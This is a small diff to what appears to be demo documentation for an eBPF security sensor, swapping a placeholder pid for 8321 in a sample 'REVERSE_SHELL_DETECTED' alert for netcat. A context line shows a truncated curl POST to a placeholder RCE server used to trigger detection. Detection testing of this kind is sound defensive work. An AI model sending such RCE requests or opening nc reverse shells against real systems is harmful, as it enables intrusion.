@@ -44,5 +44,5 @@ curl -X POST http://<rce_server_ip>:5000/ -d /
 
 # Watch the output of eBPF-sensor
 [ALERT] REVERSE_SHELL_DETECTED
-  pid=n_pid     comm=nc
+  pid=8321     comm=nc
   ATT&CK: T1071.001 (Web Protocol)
